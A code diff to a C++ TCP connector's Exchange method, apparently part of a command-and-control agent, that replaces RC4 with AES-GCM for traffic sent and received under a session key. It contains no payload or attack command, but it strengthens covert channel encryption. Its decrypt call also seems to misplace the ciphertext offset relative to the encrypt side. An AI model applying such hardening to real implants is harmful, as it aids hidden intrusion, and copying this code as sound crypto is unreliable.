@@ -274,8 +274,12 @@ void ConnectorTCP::Disconnect()
 void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
     if (plainData && plainSize > 0) {
-        EncryptRC4(plainData, plainSize, sessionKey, 16);
-        this->SendData(plainData, plainSize);
+        ULONG encSize = GCM_NONCE_SIZE + plainSize + GCM_TAG_SIZE;
+        BYTE* encData = (BYTE*)MemAllocLocal(encSize);
+        AESGCMEncrypt(plainData, plainSize, sessionKey,
+                      encData, encData+GCM_NONCE_SIZE, encData+GCM_NONCE_SIZE+plainSize);
+        this->SendData(encData, encSize);
+        MemFreeLocal((LPVOID*)&encData, encSize);
     }
     else {
         this->SendData(NULL, 0);
@@ -286,8 +290,21 @@ void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
         return;
     }
 
-    if (this->recvSize > 0 && this->recvData) {
-        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+    if (this->recvSize > (int)(GCM_NONCE_SIZE + GCM_TAG_SIZE) && this->recvData) {
+        int plainLen = this->recvSize - GCM_NONCE_SIZE - GCM_TAG_SIZE;
+        BYTE* plainBuf = (BYTE*)MemAllocLocal(plainLen);
+        if (plainBuf) {
+            if (AESGCMDecrypt(this->recvData, plainLen, sessionKey,
+                              this->recvData, plainBuf,
+                              this->recvData + this->recvSize - GCM_TAG_SIZE)) {
+                memset(this->recvData, 0, this->recvSize);
+                MemFreeLocal((LPVOID*)&this->recvData, this->recvSize);
+                this->recvData = plainBuf;
+                this->recvSize = plainLen;
+            } else {
+                MemFreeLocal((LPVOID*)&plainBuf, plainLen);
+            }
+        }
     }
 }
 
